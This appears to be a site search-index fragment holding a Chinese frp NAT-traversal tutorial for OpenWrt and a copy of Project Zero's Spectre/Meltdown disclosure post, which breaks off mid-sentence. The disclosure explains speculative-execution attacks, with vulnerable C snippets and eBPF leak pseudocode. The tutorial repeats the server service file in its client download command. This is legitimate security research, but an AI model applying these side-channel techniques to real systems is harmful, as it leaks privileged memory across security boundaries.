\u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_1","text":"\u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 5M","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_2","text":"\u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* \u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"\u642d\u5efa\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/","text":"Reading privileged memory with a side-channel Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 . Tested Processors Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document) Glossary retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred. Variant 1: Bounds check bypass This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl. Theoretical explanation The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further. Attacking the kernel This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core. Variant 2: Branch target injection This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second. Basics Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction. Haswell branch prediction internals Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, 